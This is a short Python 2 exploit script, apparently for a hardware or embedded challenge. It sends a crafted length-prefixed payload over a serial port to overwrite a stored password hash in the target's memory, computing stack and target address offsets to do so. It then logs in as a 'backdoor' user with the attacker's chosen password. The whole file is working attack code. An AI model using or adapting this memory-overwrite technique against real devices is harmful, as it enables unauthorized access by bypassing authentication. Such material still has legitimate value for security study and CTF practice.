import serial
from time import sleep
import hashlib

pasw="pass1"
usrname="backdoor"

m=hashlib.sha256()
m.update(pasw)
pass_hash=m.digest()
if ("\n" in pass_hash):
    print "pass hash has 0x0a"
print pass_hash.encode('hex')

target_address=0x3023-0x22 #location of pass hash (backdoor user)
sp_base=0x3ebf
#usr_ptr=target_address+0x22

payload=pass_hash#+chr(usr_ptr&0xFF)+chr(usr_ptr>>8)+usrname
addr_diff=sp_base-target_address
#print a


with serial.Serial('/dev/ttyUSB0',115200) as tty:
    sleep(2)
    tty.write("\n")
    sleep(1)
    print tty.read(tty.in_waiting or 1)
    
    n1=len(payload)
    n2=addr_diff-len(str(n1))-len(":")-len(str(addr_diff))-len(":")-n1
    print "send payload "+str(n1)+":"+str(n2)+":"+repr(payload)
    
    tty.write(str(n1)+":"+str(n2)+":"+payload+"1\n")
    sleep(20)
    print tty.read(tty.in_waiting or 1)
    
    print "send pass: "+str(len(usrname))+":"+str(len(pasw))+":"+usrname+pasw
    
    tty.write(str(len(usrname))+":"+str(len(pasw))+":"+usrname+pasw+"\n")
    sleep(20)
    print tty.read(tty.in_waiting or 1)